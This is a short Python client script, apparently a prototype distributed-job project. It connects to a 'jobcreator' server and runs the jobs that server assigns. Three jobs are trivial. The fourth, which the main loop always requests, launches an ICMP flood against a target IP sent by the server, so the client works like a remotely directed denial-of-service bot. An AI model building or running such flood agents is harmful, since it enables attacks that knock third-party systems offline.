import socket
import random
import time
import sys
import Prototype_Files.Jobs

PORT = 6000
FORMAT = 'utf-8'
SERVER = socket.gethostbyname(socket.gethostname())#gets ip
DISCONNECT = "qerty1234" #shared disconnect message
ADDR = (SERVER, PORT) 
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#creates client socket
client.connect(ADDR) #connects socket to remote host
val = "y"
jobList = ["job 1","job 2", "job 3", "job 4"]

def send(msg): #function to send messages to jobcreator
    message = msg.encode(FORMAT) 
    client.send(message) 
    received = client.recv(2048).decode(FORMAT)
    print(received)
    if received.find("job 1") != -1:
        job1()
    elif received.find("job 2") != -1:
        job2()
    elif received.find("job 3") != -1:
        job3()
    elif received.find("job 4") != -1:
        # gets the target ip
        a = received.split(':')
        Prototype_Files.Jobs.ICMPFlood(a[1].strip()).doJob();
        send("job 4 Completed Successfully :)")
    elif received.find("terminated") != -1:
        sys.exit(1)
    elif received == ("unavailable"):
        print("waiting for job to be available")
        send("understood awaiting for job")

        
#jobs that the seeker can do?       
def job1():
    print("Job Description: wait for 2 seconds ya goob")
    time.sleep(2)
    send("job 1 Completed Successfully :)")

def job2():
    print("Job Description: sort a string")
    msg = "wow dude"
    sorted_number = sorted(msg)
    print(f"job 2 Completed...\nOriginal String: [{msg}] Numbers are now sorted Successfully: {sorted_number}")
    send(f"job 2 Completed Successfully")

def job3():
    print("Job Description: wait 5 seconds")
    time.sleep(5)
    send("job 3 Completed Successfully :)")


try:
    while True:
        val = input("Want a stupid job y/n")
        if val == "y":
            send(jobList[3])
        else:
            sys.exit(1)

except:
    sys.exit(1)


    




